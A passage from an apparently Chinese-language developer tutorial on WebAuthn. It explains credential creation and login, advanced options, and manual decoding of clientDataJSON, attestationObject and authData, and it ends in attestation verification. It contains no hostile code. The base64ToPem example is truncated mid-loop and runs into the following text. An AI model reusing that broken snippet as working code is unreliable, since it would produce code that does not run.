自行设置\r\n    pubKeyCredParams: [\r\n        {\r\n            type: \"public-key\",\r\n            alg: -7 // ES256\r\n        },\r\n        {\r\n            type: \"public-key\",\r\n            alg: -257 // RS256\r\n        }\r\n    ],\r\n    authenticatorSelection: {\r\n        userVerification: \"discouraged\",\r\n        authenticatorAttachment: null // 除非用户指定，大部分情况下无需指定\r\n    },\r\n    excludeCredentials, // 自行设置\r\n    timeout: 60000\r\n}</pre>\n<p>然后就是传入 <code>navigator.credentials.create()</code>，拿到 <code>PublicKeyCredential</code>。如果一切顺利，接下来我们就需要考虑如何将返回的内容传回依赖方了。由于我们拿到的很多都是 <code>ArrayBuffer</code>，我们需要将其进行编码。再准备一个工具函数吧：</p>\n<pre class=\"EnlighterJSRAW\" data-enlighter-language=\"js\">function array2b64String(a) {\r\n    return window.btoa(String.fromCharCode(...a));\r\n}</pre>\n<p>然后适当处理，我们就可以得到一个方便传输的 JSON 字符串了：</p>\n<pre class=\"EnlighterJSRAW\" data-enlighter-language=\"js\">navigator.credentials.create({publicKey}).then((credentialInfo) =&gt; {\r\n    const publicKeyCredential = {\r\n        id: credentialInfo.id,\r\n        type: credentialInfo.type,\r\n        rawId: array2b64String(new Uint8Array(credentialInfo.rawId)),\r\n        response: {\r\n            clientDataJSON: array2b64String(new Uint8Array(credentialInfo.response.clientDataJSON)),\r\n            attestationObject: array2b64String(new Uint8Array(credentialInfo.response.attestationObject))\r\n        }\r\n    };\r\n    return publicKeyCredential;\r\n}).then(JSON.stringify).then((authenticatorResponseJSON) =&gt; {\r\n    // 可以发送了\r\n}).catch((error) =&gt; {\r\n    console.warn(error); // 捕获错误\r\n})</pre>\n<p>依赖方收到数据以后，还需要做三件事：验证挑战、存储凭证 ID 和存储公钥。如果数据解码顺利，且收到的挑战和之前发送的一致，就可以认为注册成功，将凭证 ID 及公钥与用户关联起来。这一步有很多第三方库可以帮我们做，对于基础实现我们就不深入探究了。</p>\n<blockquote><p>由于不同厂商的认证器的实现方式不同，<strong>我们并不能保证凭证 ID 一定是全局唯一的</strong>，也就是说，凭证 ID 有可能碰撞——即使这些凭证实际上是不同的。依赖方在实现凭证 ID 的存储及查找时，需要注意和用户 ID 结合进行存储或查找，或是直接在注册认证器时在服务器端对比阻止相同的凭证 ID。</p></blockquote>\n<hr><p>接下来就可以进行验证了。某天，用户点击了验证按钮准备登录，于是浏览器发送了验证请求到依赖方，同时附上要登录的用户名。接下来依赖方至少需要发送两项内容给浏览器：<strong>挑战和用户已绑定的凭证 ID 列表（即 <code>allowCredentials</code>）。</strong></p>\n<p>之后前端的处理流程就和注册时基本一致了。只是需要注意验证流程中获取到的 <code>PublicKeyCredential</code> 的结构和注册时的稍有不同。</p>\n<p>当浏览器将数据传回后，依赖方需要做的事情就比之前要麻烦一些了。依赖方需要验证挑战，并用之前存储的公钥验证签名和签名计数。同样地，这一步有很多第三方库可以帮我们做。最后，如果验证全部通过，我们就可以允许用户登录了。</p>\n<p>到目前为止，我们已经实现了一个简单的 WebAuthn 验证服务。不过这只是一个最基础的实现，对于很多高安全要求的身份认证这是远远不够的。因此，我们需要摆脱对第三方库的依赖，深入了解 WebAuthn。你可以继续阅读“<a href=\"https://flyhigher.top/#deep-into-webauthn\">深入了解 WebAuthn</a>”部分，不过对于基础的 WebAuthn 实现，我们的旅程就到这里了。</p>\n<h2>拓展阅读</h2>\n<p>如果你的目标只是快速了解如何开发 WebAuthn，那么你阅读到这里就可以了。同时，上一节例子中的部分代码来自于我为了这篇文章开发的 WordPress 插件 WP-WebAuthn，这个插件可以为你的 WordPress 启用 WebAuthn 无密码登录（并非二步验证），你可以查阅插件的 <a href=\"https://github.com/yrccondor/wp-webauthn\">GitHub 存储库</a>了解更多，也可以自己安装试一试。</p>\n<p>如果你正在使用 Chrome 开发，Chrome 87+ 版本添加了一个 WebAuthn 开发者面板，可以帮助你在没有任何实体验证器的情况下开发 WebAuthn 功能。你可以在 Google 的<a href=\"https://developers.google.com/web/tools/chrome-devtools/webauthn\">这篇文章</a>中了解更多。不够，如果你正在使用 Firefox，很遗憾目前我还没有找到对应的开发工具或是浏览器扩展可用。</p>\n<p>如果你希望了解更多关于非对称加密的数学证明，可以查阅阮一峰老师的<a href=\"http://www.ruanyifeng.com/blog/2013/06/rsa_algorithm_part_one.html\">这篇文章</a>。</p>\n<p>如果你希望了解更多关于 Credential Management API 的信息，可以查阅<a href=\"https://medium.com/dev-channel/sign-in-on-the-web-credential-management-api-and-best-practices-d21aed14b6fe\">这篇文章</a>（英文）。</p>\n<p>如果你希望了解更多 WebAuthn 的细节，可以继续往下阅读。<span></span></p>\n<h1>深入了解 WebAuthn</h1>\n<p>如上文所说，如果摆脱对第三方库的依赖，或是要实现更安全的 WebAuthn，我们必须深入了解 WebAuthn。在这一部分中，我们会详细讨论上文没有提到的一些概念和参数，并了解 WebAuthn 中各类数据的结构以实现解码与验证。先来看一看一些进阶的选项吧。</p>\n<h2>进阶选项</h2>\n<p>没错，上文提到的传入 <code>navigator.credentials.create()</code> 和 <code>navigator.credentials.get()</code> 方法的参数其实只是所有参数的一部分。对于 <code>create()</code>，我们还可以配置这些可选内容（上文提及的已省略）：</p>\n<pre class=\"EnlighterJSRAW\" data-enlighter-language=\"js\">navigator.credentials.create({\r\n    publicKey: {\r\n        rp: {\r\n            icon\r\n        },\r\n        user: {\r\n            icon\r\n        },\r\n        attestation,\r\n        authenticatorSelection: {\r\n            requireResidentKey\r\n        },\r\n        extensions\r\n    }\r\n})</pre>\n</pre>\n<ul>\n<li>\n<code>rp.icon: String</code> 和 <code>user.icon</code>：是的，你可以为依赖方和用户设置图标，可以使用 HTTPS URL 或 Base64，一般长度不能超过 128 字节，不过大部分浏览器不会显示图标，或是有非常小的图片体积限制，所以一般没有使用这一属性的必要</li>\n<li>\n<code>attestation: String</code>：表明依赖方是否需要证明。可选三个值：\n<ul>\n<li>\n<code>none</code>：（默认）不需要证明。如上文所述，依赖方不关心证明，因此认证器不会签名。对于 iOS/iPad OS 13，必须设置为此值，否则验证将失败</li>\n<li>\n<code>indirect</code>：依赖方需要证明，但证明方式可由认证器选择。在支持匿名证明的认证器上，认证器会通过匿名证明的方式签名挑战，并向依赖方提供签名方式等信息</li>\n<li>\n<code>direct</code>：依赖方要求直接证明。此时认证器会使用烧录在认证器中的公钥进行签名，同时向依赖方提供签名方式等信息以供依赖方验证认证器是否可信。更多信息可以阅读“<a href=\"https://flyhigher.top/#verify-authenticator\">验证认证器</a>”一节</li>\n</ul>\n</li>\n<li>在 <code>authenticatorSelection</code> 中，我们还可以设置两个可选属性：\n<ul>\n<li>\n<code>authenticatorSelection.requireResidentKey: Boolean</code>：是否要求将私钥钥永久存储于认证器中。默认值为 <code>false</code>。对于 iOS/iPad OS 13，必须设置为 <code>false</code>，否则验证将失败</li>\n</ul>\n</li>\n</ul>\n<li>\n<code>extensions: Object</code>：WebAuthn 扩展，可以提供规范之外的配置和响应。由于实际情况中很少会使用这一特性，我们不会在这篇文章中讨论它</li>\n\n<blockquote><p>将 <code>requireResidentKey</code> 设置为 <code>true</code> 可以实现无用户名的登录，即认证器同时替代了用户名和密码。需要注意的是，尽管大部分认证器可以实现无限对公私钥，<strong>但能永久存储的私钥数量是有限的</strong>（对于 Yubikey，这通常是 25），因此只应在真正需要的时候启用此特性。我们会在“<a href=\"https://flyhigher.top/#login-without-username\">无用户名登录</a>”一节中详细讨论原因。</p></blockquote>\n<blockquote><p><strong>如果你没有高安全需求（如银行交易等），请不要向认证器索取证明</strong>，即将 <code>attestation</code> 设置为 \"none\"。对于普通身份认证来说，要求证明不必要的，且会有浏览器提示打扰到用户。</p></blockquote>\n<blockquote><p>Android 暂时无法实施用户验证，进而会导致依赖方验证失败。你可以在<a href=\"https://bugs.chromium.org/p/chromium/issues/detail?id=997538\">这里</a>追踪这个特性的实现情况。</p></blockquote>\n<blockquote>\n<p>对于 <code>extensions</code>，由于目前浏览器支持和应用范围有限，我们不会在这篇文章中涉及，不过你可以看一个例子：</p>\n<pre class=\"EnlighterJSRAW\" data-enlighter-language=\"js\">extensions: {\r\n    uvm: true, // 要求认证器返回用户进行验证的方法\r\n    txAuthSimple: \"Please proceed\" // 在认证器上显示与交易有关的简短消息\r\n}</pre>\n<p>你可以在<a href=\"https://www.w3.org/2019/01/webauthn-extensions.html\">这个页面</a>了解更多关于 <code>extensions</code> 的信息。</p>\n</blockquote>\n<p>对于 <code>get()</code>，我们其实只有一个可选内容没讲了，即 <code>extensions</code>。和上文一样，我们不会在这篇文章中讨论它。</p>\n<p>就这些了！<span></span></p>\n<h2>手动解个码</h2>\n<p>是时候看看如何手动解码了。我们将会在这一节中讨论认证器返回的数据的结构以及如何正确地解码它们。</p>\n<p>首先我们来看看如何处理注册过程中认证器发回的数据。假设所有 <code>ArrayBuffer</code> 类型的值都被正确地以 Base64 编码，且后端已经将 JSON 的字符串解析为字典。先来复习一下，我们得到的数据应该是这样的（数据较长，已省略一部分）：</p>\n<pre class=\"EnlighterJSRAW\" data-enlighter-language=\"js\">{\r\n    id: \"ZRBkDBCEtq...9XY8atOcbg\",\r\n    type: \"public-key\",\r\n    rawId: \"ZRBkDBCEtq...9XY8atOcbg==\",\r\n    response: {\r\n        clientDataJSON: \"eyJjaGFsbGVuZ2U...i5jcmVhdGUifQ==\",\r\n        attestationObject: \"o2NmbXRkbm9uZWd...xNHuAMzz2LxZA==\"\r\n    }\r\n}</pre>\n<p>这里的 <code>id</code> 就是凭证的 ID，如果验证正确，我们最终要将它存储起来并于用户关联。同时可以看到 Base64 编码后的 <code>rawId</code> 其实和 <code>id</code> 是一致的（不过 <code>id</code> 是 Base64URL 编码的）。而 <code>type</code> 则一定是 \"public-key\"。</p>\n<p>不过，我们主要关心的还是 <code>respose</code> 中的两项内容。首先是 <code>clientDataJSON</code>。它的处理比较简单，看名字就知道，它应该是一个 JSON 字符串。</p>\n<blockquote><p>小技巧：如果你看到一个 Base64 编码的字符串以 \"ey\" 开头，那么它大概率是一个 Base64 编码的 JSON。</p></blockquote>\n<p>将<code>clientDataJSON</code> Base64 解码再 JSON 解码之后我们就能得到一个字典：</p>\n<pre class=\"EnlighterJSRAW\" data-enlighter-language=\"js\">{\r\n    challenge: \"NI4i1vsNmP2KHcmyFnBCKRVQPfHgg34SsYZUOPZY2lM\",\r\n    extra_keys_may_be_added_here: \"do not compare clientDataJSON against a template. See https://goo.gl/yabPex\",\r\n    origin: \"https://dev.axton.cc\",\r\n    type: \"webauthn.create\"\r\n}</pre>\n<p>结构一目了然。在这里，我们需要验证三项内容：</p>\n<ul>\n<li>\n<code>challenge</code> 和之前发送的一致</li>\n<li>\n<code>origin</code> 为创建凭证的页面的源（协议+主机名+端口号，并非 URL）</li>\n<li>\n<code>type</code> 为 \"webauthn.create\"</li>\n</ul>\n<p>同时可以注意到有一个奇怪的 <code>extra_keys_may_be_added_here</code>。这其实是 Google 在 Chrome 中搞的一点小把戏，有一定概率会出现，提醒我们需要将 JSON 解析后再验证键值以防额外插入的键值影响验证。具体信息你可以访问那个 URL 看一看。</p>\n<p>对于 Firefox，我们会多得到两项 <code>clientExtensions</code> 和 <code>hashAlgorithm</code> ，分别指明了客户端扩展数据和签名算法。</p>\n<pre class=\"EnlighterJSRAW\" data-enlighter-language=\"js\" data-enlighter-highlight=\"3-4\">{\r\n    challenge: \"dg6ost6ujhAA0g6WqLe-SOOH-tbhvjW9Sp90aPKlLJI\",\r\n    clientExtensions: {},\r\n    hashAlgorithm: \"SHA-256\",\r\n    origin: \"https://dev.axton.cc\",\r\n    type: \"webauthn.create\"\r\n}</pre>\n<p>由于本文不考虑扩展数据，因此我们可以不考虑 <code>clientExtensions</code>。同时由于目前规范中指定的签名算法只有 SHA-256 一种，因此现阶段我们也可以简单地忽略 <code>hashAlgorithm</code>。</p>\n<p><code>clientDataJSON</code> 很简单地就处理完了。接下来我们要来看看 <code>attestationObject</code>。先来看看 <code>attestationObject</code> 的结构图示：</p>\n<a href=\"https://acdn.flyhigher.top/wp-content/uploads/2020/03/s1-3.png\"><img loading=\"lazy\" src=\"https://acdn.flyhigher.top/wp-content/uploads/2020/03/s1-3.png?x-oss-process=image/interlace,1/quality,Q_90#\" alt=\"attestationObject 的结构\" width=\"1056\" height=\"532\" class=\"aligncenter size-full wp-image-2245\"></a>\n<p><code>attestationObject</code> 是 CBOR 编码后再被 Base64 编码的，因此我们需要额外对其进行 CBOR 解码。</p>\n<blockquote><p>CBOR (Concise Binary Object Representation, 简明二进制对象表示) 是一种多应用于物联网领域的编码方式，你可以将它看作体积更小、更方便物联网传输的二进制 JSON。大部分语言都可以找到对应的 CBOR 解码库。</p></blockquote>\n<p>我们当然不会手解 CBOR，直接来看看解开之后的样子吧：</p>\n<pre class=\"EnlighterJSRAW\" data-enlighter-language=\"js\">{\r\n    fmt: \"none\",\r\n    attStmt: {},\r\n    authData: [211, 217, 43, 24, 199, ..., 97, 238, 166, 67, 107]\r\n}</pre>\n<p>这些键值的含义如下：</p>\n<ul>\n<li>\n<code>fmt</code>：标明证明的格式。WebAuthn 预定义了几种格式，分别为：\n<ul>\n<li>\n<code>none</code>：没有证明</li>\n<li>\n<code>packed</code>：为 WebAuthn 优化的证明格式</li>\n<li>\n<code>android-safetynet</code>：Android 使用的格式</li>\n<li>\n<code>android-key</code>：又是 Android 使用的格式</li>\n<li>\n<code>fido-u2f</code>：FIDO U2F 认证器使用的格式</li>\n<li>\n<code>tpm</code>：TPM 可信平台模块使用的格式</li>\n</ul>\n</li>\n<li>\n<code>attStmt</code>：证明对象，具体格式根据 <code>fmt</code> 的不同会有所不同</li>\n<li>\n<code>authData</code>：包含公钥、签名计数等来自认证器的数据</li>\n</ul>\n<p>诶，例子里的 <code>attStmt</code> 怎么是空的？还记得之前说的吗？大部分情况下，<strong>如果依赖方不要求证明，那么认证器不会签名挑战</strong>，于是 <code>fmt</code> 会变为 \"none\"，<code>attstmt</code> 会为空。如果不是高安全要求，我们可以只对这一种情况做支持。</p>\n<blockquote><p>注意，部分情况下 Firefox 会在不要求证明（即 <code>attestation</code> 为 \"none\"）时会返回 <code>fmt</code> 为 \"packed\" 的证明。<strong>这是符合规范的。</strong>此时认证器会进行自证明，你可以视情况进行处理。具体可以阅读“<a href=\"https://flyhigher.top/#verify-authenticator\">验证认证器</a>”一节。</p></blockquote>\n<p>对于非 \"none\" 的 <code>fmt</code> 我们稍后再谈，现在我们先来看看 <code>authData</code>。来复习一下 <code>authData</code> 的结构：</p>\n<a href=\"https://acdn.flyhigher.top/wp-content/uploads/2020/03/s2-3.png\"><img loading=\"lazy\" src=\"https://acdn.flyhigher.top/wp-content/uploads/2020/03/s2-3.png?x-oss-process=image/interlace,1/quality,Q_90#\" alt=\"authData 的结构\" width=\"1056\" height=\"384\" class=\"aligncenter size-full wp-image-2240\"></a>\n<p>对于它的解码比较简单粗暴，我们要做的就是根据图示将它切开，然后适当地转换类型。其中各部分的含义如下：</p>\n<ul>\n<li>\n<code>rpIdHash</code>：如其名，SHA-256 的 <code>rpId</code>，长度 32 字节</li>\n<li>\n<code>flags</code>：标识认证状态，长度 1 字节。其中 8 位分别为：\n<ul>\n<li>\n<code>ED</code>：是否有扩展数据</li>\n<li>\n<code>AT</code>：是否包含 <code>attestedCredentialData</code>。通常注册认证器时会包含 <code>attestedCredentialData</code>，而验证时不包含</li>\n<li>保留位</li>\n<li>保留位</li>\n<li>保留位</li>\n<li>\n<code>UV</code>：用户是否已验证</li>\n<li>保留位</li>\n<li>\n<code>UP</code>：用户是否在场</li>\n</ul>\n</li>\n<li>\n<code>signCount</code>：签名计数，长度 4 字节</li>\n<li>\n<code>attestedCredentialData</code>：包含公钥等凭据数据，变长。其结构如下：\n<ul>\n<li>\n<code>aaguid</code>：认证器的 AAGUID (Authenticator Attestation GUID)，对于同一型号的认证器，它们的 AAGUID 是相同的</li>\n<li>\n<code>credentialIdLength</code>：标识 <code>credentialId</code> 的长度，长度 2 字节</li>\n<li>\n<code>credentialId</code>：凭证 ID，和 <code>rawId</code> 一致，长度由 <code>credentialIdLength</code> 定义</li>\n<li>\n<code>credentialPublicKey</code>：CBOR 编码的 COSE 格式的凭证公钥，变长</li>\n</ul>\n</li>\n<li>\n<code>extensions</code>：扩展数据，变长，本文不讨论</li>\n</ul>\n<blockquote><p>出于隐私考虑，如果不要求证明，认证器会以 0 填充 AAGUID。</p></blockquote>\n<p>如果你的后端在使用 Node.js，这里有个工具函数可以帮你完成这一步（不考虑 <code>extensions</code>）：</p>\n<pre class=\"EnlighterJSRAW\" data-enlighter-language=\"js\">function parseAuthData(buffer){\r\n    let rpIdHash = buffer.slice(0, 32);\r\n    buffer = buffer.slice(32);\r\n  \r\n    let flagsBuf = buffer.slice(0, 1);\r\n    buffer = buffer.slice(1);\r\n\r\n    let flagsInt = flagsBuf[0];\r\n    let flags = {\r\n        up: !!(flagsInt &amp; 0x01),\r\n        uv: !!(flagsInt &amp; 0x04),\r\n        at: !!(flagsInt &amp; 0x40),\r\n        ed: !!(flagsInt &amp; 0x80),\r\n        flagsInt\r\n    }\r\n\r\n    let counterBuf = buffer.slice(0, 4);\r\n    buffer = buffer.slice(4);\r\n  \r\n    let counter = counterBuf.readUInt32BE(0);\r\n\r\n    let aaguid = undefined;\r\n    let credID = undefined;\r\n    let COSEPublicKey = undefined;\r\n\r\n    if(flags.at) {\r\n        aaguid = buffer.slice(0, 16);\r\n        buffer = buffer.slice(16);\r\n\r\n        let credIDLenBuf = buffer.slice(0, 2);\r\n        buffer = buffer.slice(2);\r\n\r\n        let credIDLen = credIDLenBuf.readUInt16BE(0);\r\n        credID = buffer.slice(0, credIDLen);\r\n\r\n        buffer = buffer.slice(credIDLen);\r\n        COSEPublicKey = buffer;\r\n    }\r\n\r\n    return {rpIdHash, flagsBuf, flags, counter, counterBuf, aaguid, credID, COSEPublicKey}\r\n}</pre>\n<p>这段代码来自 <a href=\"https://gist.github.com/herrjemand/dbeb2c2b76362052e5268224660b6fbc\">herrjemand</a></p>\n<p>解开后，依赖方至少需要做四件事情：</p>\n<ol>\n<li>验证 <code>rpIdHash</code> 和预期的一致</li>\n<li>按预期检查用户在场和用户验证状态</li>\n<li>存储签名计数</li>\n<li>存储公钥</li>\n</ol>\n<blockquote><p>签名计数不一定从 0 开始。</p></blockquote>\n<p>对于公钥，也就是 <code>credentialPublicKey</code>，我们需要多一次 CBOR 解码，然后就可以得到类似这样的公钥：</p>\n<pre class=\"EnlighterJSRAW\" data-enlighter-language=\"js\">{\r\n    kty: \"EC\",\r\n    alg: \"ECDSA_w_SHA256\",\r\n    crv: \"P-256\",\r\n    x: \"ZGQALNfqo0L7HFYQHFHCS/X5db49z0ePnuQEs3w3X8w=\",\r\n    y: \"6qYxhnjYuez/Q8N6vX7nIIGfxFWdZ25NzQfZYuYOalA=\"\r\n}</pre>\n<p>然后可以选择适当的方法将其存储起来，之后的步骤本文就不再赘述了。现在，将目光拉回来，让我们看看包含证明的 <code>attestationObject</code> 是怎么样的。我们来看一个例子：</p>\n<pre class=\"EnlighterJSRAW\" data-enlighter-language=\"js\">{\r\n    fmt: \"packed\",\r\n    attStmt: {\r\n        alg: -7,\r\n        sig: [48, 70, 2, 33, 0, ..., 132, 78, 46, 100, 21],\r\n        x5c: [\r\n            [48, 130, 2, 189, 48, 130, 1, 165, 160, 3, ..., 177, 48, 125, 191, 145, 24, 225, 169, 41, 248]\r\n        ]\r\n    },\r\n    authData: [211, 217, 43, 24, 199, ..., 158, 54, 87, 126, 54]\r\n}</pre>\n<p>这里有一个使用 \"packed\" 格式的证明。此时，<code>attStmt</code> 中包含三个值：</p>\n<ul>\n<li>\n<code>alg</code>：签名算法</li>\n<li>\n<code>sig</code>：签名值</li>\n<li>\n<code>x5c</code>：X.509 编码的证书链</li>\n</ul>\n<p>我们不会在这一节中详述对签名的验证。要了解更多信息，你可以阅读“<a href=\"https://flyhigher.top/#verify-authenticator\">验证认证器</a>”一节。现在，让我们来看看如何处理验证过程中认证器发回的数据。我们得到的数据应该是这样的（数据较长，已省略一部分）：</p>\n<pre class=\"EnlighterJSRAW\" data-enlighter-language=\"js\">{\r\n    id: \"hmqdxPLit9...BWeVxZqdvU\",\r\n    type: \"public-key\",\r\n    rawId: \"hmqdxPLit9V...BWeVxZqdvU=\",\r\n    response: {\r\n        authenticatorData: \"09krGMcWTf...UFAAAABA==\",\r\n        clientDataJSON: \"eyJjaGFsbGVuZ2U...XRobi5nZXQifQ==\",\r\n        signature: \"UsXZV3pvT3np8btj6V0g...WBkaqyt88DrD40qh+A==\",\r\n        userHandle: \"MmYxNWYzZjQyZjM...Tg2ZDY4NzhlNw==\"\r\n    }\r\n}</pre>\n<p><code>id</code>, <code>rawId</code> 和 <code>type</code> 和之前一样，这里就不再赘述了。让我们来看看 <code>response</code>。首先是 <code>clientDataJSON</code>，和之前的解法一样，要验证的内容也一样，只是 <code>type</code> 从 \"webauthn.create\" 变成了 \"webauthn.get\"。</p>\n<pre class=\"EnlighterJSRAW\" data-enlighter-language=\"js\">{\r\n    challenge: \"bnkd2CmrEuvKnAFXs2QlC3SKlg4XFvGtP4HJL1yEWyU\",\r\n    origin: \"https://dev.axton.cc\",\r\n    type: \"webauthn.get\"\r\n}</pre>\n<p>然后是 <code>userHandle</code>。前面讲过，这是认证器在创建凭证时的用户 ID。如果用户在使用 U2F 认证器，很可能这一项为空，所以大部分情况下我们不关心这一项。</p>\n<p>接着来看 <code>authenticatorData</code>。这其实就是之前的 <code>attestedCredentialData</code>，只是这次不包含公钥。以相同的方式切开数据，我们应该可以得到 <code>rpIdHash</code>, <code>flags</code>和 <code>signCount</code> 三项。此时，依赖方至少需要做这三样事情：</p>\n<ol>\n<li>验证 <code>rpIdHash</code> 和预期的一致</li>\n<li>按预期检查用户在场和用户验证状态</li>\n<li>验证签名计数大于之前存储的计数，并更新存储的计数</li>\n</ol>\n<blockquote><p>如果签名计数比之前的小，那么这个认证器很可能是伪造的，应该中止验证并返回验证失败。同时，签名计数不一定每次按 1 递增，通常只要计数比此前的大就认为计数检查通过。</p></blockquote>\n<p>最后，我们来看 <code>signature</code>，也就是签名。不过这个签名不是简单的对挑战的签名，具体算法如图所示：</p>\n<a href=\"https://acdn.flyhigher.top/wp-content/uploads/2020/03/s3-2.png\"><img loading=\"lazy\" src=\"https://acdn.flyhigher.top/wp-content/uploads/2020/03/s3-2.png?x-oss-process=image/interlace,1/quality,Q_90#\" alt=\"签名过程\" width=\"1034\" height=\"587\" class=\"aligncenter size-full wp-image-2231\"></a>\n<p>计算签名时，认证器会将 <code>authenticatorData</code> 与 <code>clientDataHash</code>（也就是 <code>clientDataJSON</code> 的 SHA-256 Hash）拼接起来，并使用对应的私钥签名。依赖方应该使用对应的公钥将其解密，并验证内容是否是 <code>authenticatorData</code> 与 <code>clientDataHash</code> 的拼接。这部分的计算不在本文的讨论范围内。</p>\n<p>最后，如果全部验证通过，返回验证成功。<span></span></p>\n<h2>验证认证器</h2>\n<p>WebAuthn 已经很安全了，但有的时候我们还要让它更安全一点。比如，如果用户在使用伪造的或是自制的认证器，认证器的安全性就得不到保证。此时，依赖方就需要验证认证器是否是可信的认证器。</p>\n<blockquote><p>这一过程仅发生在注册认证器时。此时，如果认证器验证通过，就可以存储公钥，后续步骤和之前描述的一致。</p></blockquote>\n<blockquote><p>再次说明，如果不是对安全性有极高的要求，向认证器索取证明以验证认证器是否可信是没有必要的。此外，验证认证器需要依赖方自行维护可信认证器列表，大大增加了维护的复杂性。</p></blockquote>\n<p>在调用 <code>navigator.credentials.create()</code> 时，我们可以将 <code>attestation</code> 设置为非 \"none\" 来向认证器索取证明。除无证明外，WebAuthn 定义了四种证明方式：</p>\n<ul>\n<li>Basic Attestation (Basic) ：基础的证明方式，认证器会使用认证器私钥签名</li>\n<li>Self Attestation (Self) ：自证明，认证器会使用凭证私钥签名</li>\n<li>Attestation CA (AttCA) ：认证器会使用多个证明私钥之一签名</li>\n<li>Elliptic Curve based Direct Anonymous Attestation (ECDAA) ：通过 <a href=\"https://en.wikipedia.org/wiki/Direct_Anonymous_Attestation\">DAA</a> 实现的匿名证明</li>\n</ul>\n<blockquote><p>和验证过程一样，这里签名的目标是 <code>authenticatorData</code> 和 <code>clientDataHash</code> 的连接。</p></blockquote>\n<p>还记得 <code>create()</code> 时 <code>attestation</code> 可选的三个值吗？这个值会决定认证器最终使用哪种方式进行证明。复习一下：</p>\n<ul>\n<li>\n<code>none</code>：大部分情况下认证器会选择不进行证明，部分认证器会进行自证明。此时 AAGUID 会被 0 填充</li>\n<li>\n<code>indirect</code>：认证器会试图通过替换 AAGUID 和选择合适的证明方式来进行匿名证明，具体方式由认证器选择</li>\n<li>\n<code>direct</code>：认证器会提供最直接的证明信息</li>\n</ul>\n<p>注意，大部分情况下，当认证器需要向依赖方证明自己可信时需要提供认证器公钥，<strong>这会触发浏览器提示，只有用户同意后认证器才会进行证明，否则认证器将不提供证明。</strong></p>\n<a href=\"https://acdn.flyhigher.top/wp-content/uploads/2020/03/5.png\"><img loading=\"lazy\" src=\"https://acdn.flyhigher.top/wp-content/uploads/2020/03/5.png?x-oss-process=image/interlace,1/quality,Q_90#\" alt=\"浏览器提示\" width=\"446\" height=\"283\" class=\"aligncenter size-full wp-image-2217\"></a>\n<blockquote><p>为什么浏览器会说“安全密钥的品牌和型号”？事实上，为了避免用户通过认证器证书被跨依赖方追踪，FIDO 要求使用相同认证器证书的认证器的数量不能少于 100,000。于是大部分认证器厂商会选择<strong>让同一型号的认证器共用同一份证书。</strong>因此，浏览器的会询问用户是否同意“查看安全密钥的品牌和型号”。</p></blockquote>\n<blockquote><p>Android Safety Net 不会向用户询问是否同意，而是会静默进行证明。</p></blockquote>\n<p>当证明不为空时，依赖方收到数据后根据 <code>attestationObject.fmt</code> 的不同，需要选择不同的验证方式来验证认证器的可信情况。出于篇幅原因，这里我们不会讨论每一种 <code>fmt</code> 的验证方式，更多信息你可以查阅 <a href=\"https://www.w3.org/TR/webauthn/#defined-attestation-formats\">W3C 文档</a>。</p>\n<p>当 <code>fmt</code> 为 <code>packed</code> 时，<code>attestationObject.attStmt</code> 可能会有三种格式：</p>\n<pre class=\"EnlighterJSRAW\" data-enlighter-language=\"js\">// 自证明\r\n{\r\n    alg, // 算法\r\n    sig // 签名\r\n}\r\n// 基础或证明 CA 证明\r\n{\r\n    alg,\r\n    sig,\r\n    x5c // X.509 证书链\r\n}\r\n// 椭圆曲线证明\r\n{\r\n    alg,\r\n    sig,\r\n    ecdaaKeyId // ECDAA-Issuer 公钥标识符\r\n}</pre>\n<p>此时，依赖方需要检查证书符合预期格式并检查证书是否在可信链上。首先，如果证明中既没有 <code>ecdaaKeyId</code> 也没有 <code>x5c</code>，就说明这个证明使用的是自证明，只需使用认证器提供的公钥验证即可；如果有 <code>x5c</code>，那么就需要验证 <code>x5c</code> 中的证书是否在可信链上。将 <code>x5c</code> 中的每个证书以 Base64 编码，按 64 个字符切开，并在头尾加上 <code>-----BEGIN CERTIFICATE-----</code> 和 <code>-----END CERTIFICATE-----</code>就能得到一个证书字符串了。之后，依赖方需要验证证书是否可信。</p>\n<pre class=\"EnlighterJSRAW\" data-enlighter-language=\"js\">function base64ToPem(b64cert){\r\n    let pemcert = '';\r\n    for(let i = 0; i \n<p>这段代码来自 <a href=\"https://gist.github.com/herrjemand/dbeb2c2b76362052e5268224660b6fbc\">herrjemand</a></p>\n<p>至于 <code>ecdaaKeyId</code>，由于目前应用较少，处理方法可能需要你另寻资料了。检查证书的具体步骤已经超出了本文的范围，具体可以查阅<a href=\"https://medium.com/@herrjemand/verifying-fido2-packed-attestation-a067a9b2facd\">这篇文章</a>（英文）。</p>\n<blockquote><p>你可以在 <a href=\"https://fidoalliance.org/metadata/\">FIDO Metadata Service</a> 找到各大厂商认证器的可信证书链。</p></blockquote>\n<p>当在 Android 上调起 WebAuthn 时，大部分情况下 <code>fmt</code> 将会为 <code>safety-net</code>。此时 <code>attestationObject.attStmt</code> 的结构会是：</p>\n<pre class=\"EnlighterJSRAW\" data-enlighter-language=\"js\">{\r\n    ver: \"200616037\",\r\n    response: {\r\n        type: \"Buffer\",\r\n        data: [101, 121, 74, 104, 98, ..., 115, 104, 104, 82, 65]\r\n    }\r\n}</pre>\n<p>此时，<code>clientDataJSON</code> 中还会出现 <code>androidPackageName</code> 键，值是调起 WebAuthn 验证的应用的包名，如 Chrome 就是 \"com.android.chrome\"。</p>\n<p>在这个证明中，<code>data</code> 其实是一个 JWT 字符串，我们可以将它编码为字符串并将其按照 JWT 进行解码（别忘了验证 JWT 签名）。最终我们会得到一个类似这样的 Payload：</p>\n<pre class=\"EnlighterJSRAW\" data-enlighter-language=\"js\">{\r\n    nonce: \"0QAurN4F9wik6GEkblDJhGuf4kuaqZn5zaaxlvD1hlA=\",\r\n    timestampMs: 1584950686460,\r\n    apkPackageName: \"com.google.android.gms\",\r\n    apkDigestSha256: \"2BQHno+bmWWwdLUYylS8HLt5ESJzci3nt2uui71ojyE=\",\r\n    ctsProfileMatch: true,\r\n    apkCertificateDigestSha256: [\r\n        \"8P1sW0EPicslw7UzRsiXL64w+O50Ed+RBICtay2g24M=\"\r\n    ],\r\n    basicIntegrity: true,\r\n    evaluationType: \"BASIC\"\r\n}</pre>\n<p>其中包含了有关设备状态的一些信息。比如说，如果 <code>ctsProfileMatch</code> 为 <code>false</code>，那么该设备很有可能被 root 了。对于高安全要求的场景，我们可以视情况进行验证。</p>\n<p>同时我们可以在 JWT Header 中验证证明的有效性。我们应该能取得这样的 Header：</p>\n<pre class=\"EnlighterJSRAW\" data-enlighter-language=\"js\">{\r\n    alg: \"RS256\",\r\n    x5c: [\r\n        